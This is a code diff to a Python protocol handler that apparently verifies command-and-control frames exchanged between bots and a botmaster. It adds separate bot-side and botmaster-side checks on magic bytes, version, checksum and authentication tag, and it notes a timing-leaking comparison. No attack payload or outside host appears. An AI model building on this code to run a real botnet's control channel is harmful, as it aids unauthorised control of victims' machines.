@@ -3,7 +3,7 @@ import os
 import random
 import struct
 import zlib
-from globvars import ROOT_SECRET, MAGIC_BYTES, PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, CMD_TYPES
+from globvars import ROOT_SECRET, MAGIC_BYTES, PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, CMD_TYPES, RESP_TYPES
 
 class ProtocolHandler:
     def __init__(self, secret: bytes):
@@ -71,15 +71,49 @@ class ProtocolHandler:
             return None
 
 
-    def verify_frame(self, data: tuple) -> bool: 
+    def verify_frame_bot_side(self, data: tuple) -> bool: 
         (magic, version, cmd_type, length, auth, payload, checksum) = data
         
         if magic != MAGIC_BYTES:
             print("Magic bytes mismatch")
             return False
 
-        if cmd_type not in CMD_TYPES.values():
-            print("Command type mismatch")
+        # if not (cmd_type in CMD_TYPES.values() or cmd_type in RESP_TYPES.values()):
+        if not (cmd_type in CMD_TYPES.values()): 
+            print(f"Command type mismatch ({cmd_type})")
+            return False
+        
+        # min/max payload size is not set yet
+        # if length <= MIN_FRAME_SIZE or length >= MAX_FRAME_SIZE:
+        #     print("Invalid frame length")
+        #     return False
+        
+        if version != PROTOCOL_VERSION:
+            print("Version mismatch.")
+            return False
+        
+        if zlib.crc32(payload) & 0xffffffff != checksum:
+            print("Checksum mismatch.")
+            return False
+    
+        # TODO
+        # this leaks timing info! use constant-time comparison primitve instead
+        expected_auth = self.compute_auth_tag(self.secret, payload)
+        if auth != expected_auth:
+            print("Authentication failed.")
+            return False
+
+        return True 
+
+    def verify_frame_botmaster_side(self, data: tuple) -> bool: 
+        (magic, version, cmd_type, length, auth, payload, checksum) = data
+        
+        if magic != MAGIC_BYTES:
+            print("Magic bytes mismatch")
+            return False
+
+        if not (cmd_type in RESP_TYPES.values()): 
+            print(f"Command type mismatch ({cmd_type})")
             return False
         
         # min/max payload size is not set yet
